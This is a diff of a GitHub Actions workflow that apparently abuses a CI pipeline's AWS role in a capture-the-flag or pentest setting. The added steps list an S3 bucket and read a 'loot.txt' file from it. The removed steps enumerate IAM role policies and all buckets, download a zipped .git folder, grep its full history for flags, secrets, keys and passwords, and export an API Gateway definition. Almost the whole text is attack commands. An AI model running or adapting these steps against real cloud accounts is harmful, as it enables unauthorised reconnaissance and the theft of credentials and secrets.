@@ -14,6 +14,7 @@ jobs:
       contents: read
 
     steps:
+
       - name: Get AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
@@ -24,70 +25,21 @@ jobs:
         run: |
           aws sts get-caller-identity
 
+      - name: Check S3 bucket
+        run: |
+          echo "===== S3 CONTENT ====="
+          aws s3 ls s3://codec4f26c862a321ef5/
+
+      - name: Read loot file
+        run: |
+          echo "===== LOOT CONTENT ====="
+          aws s3 cp s3://codec4f26c862a321ef5/loot.txt - || true
+
       - name: Lambda information
         run: |
           echo "===== LAMBDA CONFIG ====="
           aws lambda get-function-configuration \
             --function-name nslookupv2
-
-      - name: Check loot file
-         run: |
-          echo "===== S3 CONTENT ====="
-          aws s3 ls s3://codec4f26c862a321ef5/
-
-          echo "===== LOOT CONTENT ====="
-          aws s3 cp s3://codec4f26c862a321ef5/loot.txt -
-
-      - name: Lambda role permissions
-        run: |
-          echo "===== ROLE POLICIES ====="
-
-          aws iam list-attached-role-policies \
-            --role-name lambdaRole || true
-
-          aws iam list-role-policies \
-            --role-name lambdaRole || true
-
-      - name: S3 enumeration
-        run: |
-          echo "===== BUCKETS ====="
-          aws s3 ls
-
-          echo "===== CODE BUCKET ====="
-          aws s3 ls s3://codec4f26c862a321ef5/ || true
-
-          echo "===== PLATFORM BUCKET ====="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
-
-      - name: Download dotgit
-        run: |
-          mkdir -p loot
-
-          aws s3 cp \
-            s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
-            loot/dotgit.zip
-
-          unzip -o loot/dotgit.zip -d loot
-
-          echo "===== GIT HISTORY ====="
-
-          cd loot/dotgit
-
-          git log --oneline --all
-
-          git grep -nEi "flag|secret|lambda|s3|api|key|password" $(git rev-list --all) || true
-
-      - name: API Gateway export
-        run: |
-          echo "===== API EXPORT ====="
-
-          aws apigateway get-export \
-            --rest-api-id 3q931syi7b \
-            --stage-name dev \
-            --export-type oas30 \
-            api.json || true
-
-          cat api.json || true
 
       - name: Test API
         run: |
